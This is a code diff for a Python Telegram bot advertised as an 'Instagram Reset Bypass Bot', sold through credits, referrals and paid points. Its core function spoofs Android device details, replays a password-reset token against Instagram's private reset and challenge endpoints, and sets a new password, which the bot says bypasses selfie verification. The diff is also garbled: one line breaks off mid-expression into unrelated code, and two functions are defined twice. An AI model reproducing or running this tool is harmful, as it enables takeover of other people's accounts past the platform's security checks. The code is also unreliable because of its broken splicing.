@@ -620,6 +620,462 @@ def verify_user_subscription(user_id):
     return True, None
 
 def edit_or_send(chat_id, text, message_id=None, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
+    """Edit existing message or send new one if no message_id"""
+    if message_id:
+        # Edit existing message
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
+        payload = {
+            "chat_id": chat_id,
+            "message_id": message_id,
+            "text": text,
+            "parse_mode": parse_mode,
+            "disable_web_page_preview": disable_web_page_preview
+        }
+        if reply_markup:
+            payload["reply_markup"] = json.dumps(reply_markup)
+        try:
+            response = session.post(url, data=payload, timeout=5)
+            return response.json()
+        except:
+            return None
+    else:
+        # Send new message
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": chat_id,
+            "text": text,
+            "parse_mode": parse_mode,
+            "disable_web_page_preview": disable_web_page_preview
+        }
+        if reply_markup:
+            payload["reply_markup"] = json.dumps(reply_markup)
+        try:
+            response = session.post(url, data=payload, timeout=5)
+            return response.json()
+        except:
+            return None
+
+def send_subscription_required(chat_id, user_id, message_id=None):
+    """Send subscription required message with inline buttons"""
+    required_channels = []
+    for channel in FORCE_SUB_CHANNELS:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
+        params = {"chat_id": f"@{channel}", "user_id": user_id}
+        try:
+            response = session.get(url, params=params, timeout=3)
+            data = response.json()
+            if data.get("ok"):
+                status = data["result"].get("status", "")
+                if status not in ["member", "administrator", "creator"]:
+                    required_channels.append(channel)
+            else:
+                required_channels.append(channel)
+        except:
+            required_channels.append(channel)
+    
+    if not required_channels:
+        return True
+    
+    channels_list = "\n".join([f"📢 <a href='https://t.me/{ch}'>{ch}</a>" for ch in required_channels])
+    
+    msg = f"""⚠️ <b>Jᴏɪɴ Cʜᴀɴɴᴇʟs Tᴏ Usᴇ Tʜᴇ Bᴏᴛ</b>
+
+Aғᴛᴇʀ Jᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ ᴠᴇʀɪғʏ ⬇️"""
+
+    keyboard_buttons = []
+    for ch in required_channels:
+        keyboard_buttons.append([{"text": f"Jᴏɪɴ Cʜᴀɴɴᴇʟ", "url": f"https://t.me/{ch}"}])
+    
+    keyboard_buttons.append([{"text": "✅ Vᴇʀɪғɪʏ Sᴜʙsᴄʀɪᴘᴛɪᴏɴ", "callback_data": "verify_sub"}])
+    keyboard_buttons.append([{"text": "🔄 Rᴇғʀᴇsʜ", "callback_data": "refresh_sub"}])
+    
+    keyboard = {"inline_keyboard": keyboard_buttons}
+    
+    edit_or_send(chat_id, msg, message_id, keyboard, disable_web_page_preview=False)
+    return False
+
+def generate_device_info():
+    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
+    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
+    WATERFALL_ID = str(uuid.uuid4())
+    timestamp = int(datetime.now().timestamp())
+    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
+    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
+    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD
+
+def make_headers(mid="", user_agent=""):
+    return {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+        "X-Mid": mid,
+        "User-Agent": user_agent,
+        "Content-Length": "9481"
+    }
+
+def id_user(user_id):
+    try:
+        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
+        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
+        r = session.get(url, headers=headers, timeout=5)
+        try:
+            username = r.json()["user"]["username"]
+            return username
+        except:
+            return None
+    except:
+        return None
+
+def reset_instagram_password(reset_link, progress_callback=None):
+    try:
+        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
+        
+        if progress_callback:
+            progress_callback(10, "Extracting reset token...")
+        
+        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
+        token = reset_link.split("&token=")[1].split(":")[0]
+
+        if progress_callback:
+            progress_callback(25, "Sending reset request...")
+        
+        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
+        data = {
+            "source": "one_click_login_email",
+            "uidb36": uidb36,
+            "device_id": ANDROID_ID,
+            "token": token,
+            "waterfall_id": WATERFALL_ID
+        }
+        r = session.post(url, headers=make_headers(user_agent=USER_AGENT), data=data, timeout=10)
+        
+        if "user_id" not in r.text:
+            return {"success": False, "error": f"Error in reset request: {r.text[:200]}"}
+
+        if progress_callback:
+            progress_callback(40, "Processing challenge...")
+        
+        mid = r.headers.get("Ig-Set-X-Mid")
+        resp_json = r.json()
+        user_id = resp_json.get("user_id")
+        cni = resp_json.get("cni")
+        nonce_code = resp_json.get("nonce_code")
+        challenge_context = resp_json.get("challenge_context")
+
+        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
+        data2 = {
+            "user_id": str(user_id),
+            "cni": str(cni),
+            "nonce_code": str(nonce_code),
+            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
+            "challenge_context": str(challenge_context),
+            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+            "get_challenge": "true"
+        }
+        
+        if progress_callback:
+            progress_callback(55, "Solving challenge...")
+        
+        r2 = session.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=10).text
+        
+        if progress_callback:
+            progress_callback(70, "Setting new password...")
+        
+        challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]
+
+        data3 = {
+            "is_caa": "False",
+            "source": "",
+            "uidb36": "",
+            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
+            "afv": "",
+            "cni": str(cni),
+            "token": "",
+            "has_follow_up_screens": "0",
+            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
+            "challenge_context": challenge_context_final,
+            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+            "enc_new_password1": PASSWORD,
+            "enc_new_password2": PASSWORD
+        }
+        
+        session.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=10)
+        new_password = PASSWORD.split(":")[-1]
+        
+        if progress_callback:
+            progress_callback(90, "Finalizing...")
+        
+        return {
+            "success": True,
+            "password": new_password,
+            "user_id": user_id
+        }
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+def send_telegram_message(text):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
+    try:
+        session.post(url, data=payload, timeout=5)
+    except:
+        pass
+
+def get_updates(offset=None):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
+    params = {"offset": offset, "timeout": 25}
+    try:
+        response = session.get(url, params=params, timeout=30)
+        return response.json()
+    except:
+        return None
+
+def send_message(chat_id, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": disable_web_page_preview}
+    if reply_markup:
+        payload["reply_markup"] = json.dumps(reply_markup)
+    try:
+        response = session.post(url, data=payload, timeout=5)
+        return response.json()
+    except:
+        return None
+
+def send_start_menu(chat_id, user_id, message_id=None):
+    user_data = get_user_data(user_id)
+    credits = user_data["credits"]
+    referral_code = user_data["referral_code"]
+    total_referrals = user_data.get("total_referrals", 0)
+    
+    msg = f"""<b>Wᴇʟᴄᴏᴍᴇ Tᴏ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Bʏᴘᴀss Bᴏᴛ</b>
+
+📊 <b>Your Stats:</b>
+• 💎 Cʀᴇᴅɪᴛs : <code>{credits}</code>《 2 Fʀᴇᴇ Pᴇʀ Dᴀʏ 》
+• 👥 Rᴇғғᴇʀᴀʟs : <code>{total_referrals}</code> users
+• 💰 Tᴏᴛᴀʟ Pᴛs : <code>{user_data.get('total_earned', 0)}</code> Pᴛs
+
+Cʜᴏᴏsᴇ Aɴ Oᴘᴛɪᴏɴ Tᴏ Pʀᴏᴄᴇᴇᴅ ⬇️
+"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "𓁿Rᴇsᴇᴛ Bʏᴘᴀss", "callback_data": "send_reset_link"}],
+            [{"text": "👥 Rᴇғғᴇʀᴀʟ Iɴғᴏ", "callback_data": "referral_info"}, {"text": "📊 Mʏ Sᴛᴀᴛs", "callback_data": "profile"}],
+            [{"text": "❓ Hᴇʟᴘ & Sᴜᴘᴘᴏʀᴛ", "callback_data": "help"}]
+        ]
+    }
+    
+    return edit_or_send(chat_id, msg, message_id, keyboard)
+
+def send_instruction_for_link(chat_id, message_id=None):
+    msg = """Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Bʏᴘᴀss 
+
+Wɪᴛʜ Tʜɪs Fᴇᴀᴛᴜʀᴇ, Yᴏᴜ Cᴀɴ 
+ʙʏᴘᴀss Sᴇʟғɪᴇ Bᴇʀɪғɪᴄᴀᴛɪᴏɴ Bʏ Sᴇɴᴅɪɴɢ Yᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Lɪɴᴋ.
+
+Pʟᴇᴀsᴇ Sᴇɴᴅ Yᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Lɪɴᴋ ⬇️"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
+        ]
+    }
+    
+    return edit_or_send(chat_id, msg, message_id, keyboard)
+
+def send_referral_info(chat_id, user_id, message_id=None):
+    user_data = get_user_data(user_id)
+    referral_link = user_data.get("referral_link", f"https://t.me/{BOT_USERNAME}?start=ref_{user_data['referral_code']}")
+    total_referrals = user_data.get("total_referrals", 0)
+    
+    msg = f"""<b>👥 Rᴇғғᴇʀᴀʟ Pʀᴏɢʀᴀᴍ</b>
+
+<b>Yᴏᴜʀ Rᴇғғᴇʀᴀʟ Iɴᴠɪᴛᴇ Lɪɴᴋ:</b>
+
+<code>{referral_link}</code>
+
+<b>📊 Yᴏᴜʀ Sᴛᴀᴛs :</b>
+• 👥 Tᴏᴛᴀʟ Rᴇғғᴇʀᴀʟs : <code>{total_referrals}</code>
+• 💎 Pᴛs Eᴀʀɴᴇᴅ : <code>{user_data.get('total_earned', 0)}</code>
+• 💰 Cᴜʀʀᴇɴᴛ Pᴛs : <code>{user_data['credits']}</code>
+
+<b>Hᴏᴡ Iᴛ Wᴏʀᴋs ❓:</b>
+• Sʜᴀʀᴇ Yᴏᴜʀ Lɪɴᴋ Wɪᴛʜ Fʀɪᴇɴᴅs
+• Wʜᴇɴ Tʜᴇʏ Jᴏɪɴ Usɪɴɢ Yᴏᴜʀ Lɪɴᴋ
+• Yᴏᴜ Bᴏᴛʜ Gᴇᴛ <b>+2 Fʀᴇᴇ Pᴛs</b>!
+
+<b>Sʜᴀʀᴇ Tʜɪs Lɪɴᴋ :</b>
+Tᴀᴘ ᴀɴᴅ ʜᴏʟᴅ ᴛʜᴇ ʟɪɴᴋ ᴀʙᴏᴠᴇ ᴛᴏ ᴄᴏᴘʏ, ᴏʀ ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ sʜᴀʀᴇ ᴅɪʀᴇᴄᴛʟʏ!"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "📤 Share Referral Link", "url": f"https://t.me/share/url?url={referral_link}&text=Join this Instagram Password Reset Bot!"}],
+            [{"text": "📋 Copy Link", "callback_data": "copy_link"}],
+            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
+        ]
+    }
+    
+    return edit_or_send(chat_id, msg, message_id, keyboard, disable_web_page_preview=True)
+
+def send_profile(chat_id, user_id, message_id=None):
+    user_data = get_user_data(user_id)
+    msg = f"""<b>📊 Your Profile</b>
+
+💎 Pᴛs : <code>{user_data['credits']}</code>
+💰 Tᴏᴛᴀʟ Pᴛs : <code>{user_data.get('total_earned', 0)}</code>
+👥 Tᴏᴛᴀʟ Rᴇғғᴇʀᴀʟs : <code>{user_data.get('total_referrals', 0)}</code>
+📅 Lᴀsᴛ Rᴇsᴇᴛ Oɴ : <code>{user_data.get('last_reset_date', str(date.today()))}</code>
+👤 Rᴇғғᴇʀᴇᴅ Bʏ : <code>{user_data.get('referred_by') or 'None'}</code>"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
+        ]
+    }
+    
+    return edit_or_send(chat_id, msg, message_id, keyboard)
+
+def send_help(chat_id, message_id=None):
+    msg = """<b>❓ Help & Commands</b>
+
+<b>📌 How to get reset link:</b>
+1. Go to Instagram login page
+2. Click "Forgot password"
+3. Enter username/email
+4. Check your email for reset link
+5. Copy FULL link and send here
+
+<b>⚠️ Note:</b>
+• Each reset costs 1 credit
+• You get 2 free credits daily
+• Failed resets are refunded
+
+<b>💰 Get More Credits:</b>
+Use referral system! Share your unique link with friends.
+
+<b>Commands:</b>
+/start - Main menu
+/profile - Your stats
+/refer - Referral info
+/balance - Check credits
+/cancel - Cancel current operation"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
+        ]
+    }
+    
+    return edit_or_send(chat_id, msg, message_id, keyboard)
+
+def send_balance(chat_id, user_id, message_id=None):
+    user_data = get_user_data(user_id)
+    msg = f"💎 <b>Yᴏᴜʀ Rᴇᴍᴀɪɴɪɴɢ Pᴛs :</b> <code>{user_data['credits']}</code>\n\nUse /refer to get more credits!"
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
+        ]
+    }
+    
+    return edit_or_send(chat_id, msg, message_id, keyboard)
+
+def process_reset_link_with_progress(chat_id, user_id, reset_link, message_id=None):
+    """Process reset link with animated progress bar"""
+    
+    # Check credits first
+    user_data = get_user_data(user_id)
+    if user_data["credits"] < 1:
+        msg = """❌ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs!</b>
+
+Yᴏᴜ ɴᴇᴇᴅ 1 Pᴛs ᴛᴏ ʀᴇsᴇᴛ ᴀ ᴘᴀssᴡᴏʀᴅ.
+
+💡 <b>Gᴇᴛ Mᴏʀᴇ Pᴛs :</b>
+• Sʜᴀʀᴇ ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ《 2 Pᴛs ᴇᴀᴄʜ 》
+• Wᴀɪᴛ ғᴏʀ ᴅᴀɪʟʏ ʀᴇsᴇᴛ《2 ғʀᴇᴇ ᴘᴇʀ ᴅᴀʏ 》
+
+— Dᴍ @xYourKing Tᴏ Bᴜʏ Pᴛs
+
+"""
+        
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
+            ]
+        }
+        edit_or_send(chat_id, msg, message_id, keyboard)
+        return
+    
+    # Deduct credit
+    deduct_credit(user_id)
+    
+    # Progress update function
+    current_msg_id = message_id
+    if not current_msg_id:
+        # Send initial message if no message_id provided
+        result = send_message(chat_id, "⚙️ <b>Pʀᴏᴄᴇssɪɴɢ ʏᴏᴜʀ ʟɪɴᴋ...</b>\n[0%] █▒▒▒▒▒▒▒▒▒")
+        if result and "result" in result:
+            current_msg_id = result["result"]["message_id"]
+    
+    def update_progress(percent, status_text):
+        if current_msg_id:
+            if percent >        if "referred_by" not in db[user_id_str]:
+            db[user_id_str]["referred_by"] = None
+            save_db(db)
+    
+    return db[user_id_str]
+
+def update_user_credits(user_id, credits):
+    db = load_db()
+    user_id_str = str(user_id)
+    if user_id_str in db:
+        db[user_id_str]["credits"] = credits
+        save_db(db)
+
+def add_credits(user_id, amount):
+    db = load_db()
+    user_id_str = str(user_id)
+    if user_id_str in db:
+        db[user_id_str]["credits"] += amount
+        db[user_id_str]["total_earned"] = db[user_id_str].get("total_earned", 0) + amount
+        save_db(db)
+        return True
+    return False
+
+def deduct_credit(user_id):
+    user_data = get_user_data(user_id)
+    if user_data["credits"] >= 1:
+        user_data["credits"] -= 1
+        update_user_credits(user_id, user_data["credits"])
+        return True
+    return False
+
+def generate_referral_code():
+    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+
+def verify_user_subscription(user_id):
+    """Verify if user has joined all required channels"""
+    if not ENABLE_FORCE_SUB:
+        return True, None
+    
+    for channel in FORCE_SUB_CHANNELS:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
+        params = {"chat_id": f"@{channel}", "user_id": user_id}
+        try:
+            response = session.get(url, params=params, timeout=3)
+            data = response.json()
+            
+            if data.get("ok"):
+                status = data["result"].get("status", "")
+                if status not in ["member", "administrator", "creator"]:
+                    return False, channel
+            else:
+                return False, channel
+        except Exception:
+            return False, channel
+    
+    return True, None
+
+def edit_or_send(chat_id, text, message_id=None, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
     """
     Edit existing message or send new one.
     Returns message_id on success, None on failure.
